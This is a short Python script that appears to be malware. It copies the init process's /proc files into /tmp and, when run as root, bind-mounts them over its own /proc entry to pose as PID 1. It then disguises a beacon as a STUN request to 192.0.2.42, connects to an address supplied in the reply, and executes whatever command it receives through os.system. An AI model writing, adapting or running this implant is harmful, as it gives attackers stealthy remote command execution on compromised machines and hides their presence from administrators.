import os
import shutil
import socket
import struct

shutil.copyfile('/proc/1/stat', '/tmp/stat')
shutil.copyfile('/proc/1/status', '/tmp/status')
shutil.copyfile('/proc/1/cmdline', '/tmp/cmdline')
if os.getuid() == 0:
    os.system('mount --bind /tmp /proc/%d' % os.getpid())
channel = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
channel.bind(('0.0.0.0', 0))
request = struct.pack('!HHI12s', 1, 0, 0x2112a442, os.urandom(12))
channel.sendto(request, ('192.0.2.42', 3478))
control, peer = channel.recvfrom(20)
if len(control) == 20 and control[0] == 1:
    target = socket.inet_ntoa(control[4:8])
    port = struct.unpack('!H', control[8:10])[0]
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((target, port))
    command = connection.recv(1500)
    os.system(command.decode())
